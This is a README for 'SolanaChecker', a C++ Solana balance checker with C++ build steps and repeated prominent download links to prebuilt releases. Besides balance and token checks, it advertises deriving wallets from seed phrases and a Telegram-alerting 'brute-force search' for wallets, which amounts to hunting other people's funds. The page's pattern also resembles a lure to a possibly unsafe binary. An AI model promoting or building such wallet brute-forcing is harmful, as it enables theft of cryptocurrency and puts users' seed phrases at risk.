# Solana Address Checker: Verify Balances & Monitor Activity

Need to quickly check the balance of a Solana address? **SolanaChecker** is a versatile tool designed to help you do just that. Easily verify the SOL holdings of any address, and gain valuable insights into the Solana blockchain.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/design/glance.webp" />
</p>

## Key Features

1.  **Solana Address Balance Checker:** Quickly check balances.

<p align="left">
    <img src="/design/look.webp" />
</p>

2.  **Token Security Analysis:** Analyze token security.

<p align="left">
    <img src="/design/properties.webp" />
</p>

3.  **Address Tracking with Telegram:** Stay informed.

4.  **Wallet Data from Mnemonic:** Extract wallet data from seed phrases.

<p align="left">
    <img src="/design/details.webp" />
</p>

5.  **Solana Wallet Generation:** Generate new wallets.

<p align="left">
    <img src="/design/picture.webp" />
</p>

6.  **Brute-Force Search (with Telegram):** For research.

<p align="left">
    <img src="/design/message.webp" />
</p>

## Telegram Setup

Enable Telegram alerts by entering your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file.

## Getting Started

Download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Building the Project

This project uses C++ and depends on several libraries. We recommend using **vcpkg**:

### Installing Dependencies with vcpkg

1.  Install **vcpkg** if you don't have it already.
2.  Add the **vcpkg** installation directory to your PATH.
3.  Run these commands:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  Build after installation.

### Building with Visual Studio

1.  Open the project solution in Visual Studio.
2.  Ensure **vcpkg** is integrated (see [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio)).
3.  Click **Build** -> **Build Solution**.
4.  The executable is in the `bin` folder.

### Building with Another C++ Compiler

1.  Ensure all dependencies are installed via **vcpkg**.
2.  Compile with:

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

1.  **-s / -search**: Start a brute-force search.
2.  **-t / -track (ADDRESS)**: Track an address.
3.  **-g / -gen (NUMBER)**: Generate wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Display information.
5.  **-b / -balance (ADDRESS)**: Check the balance.

## Important Notes

-   For research purposes only.
-   Cryptocurrency investments involve risks.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).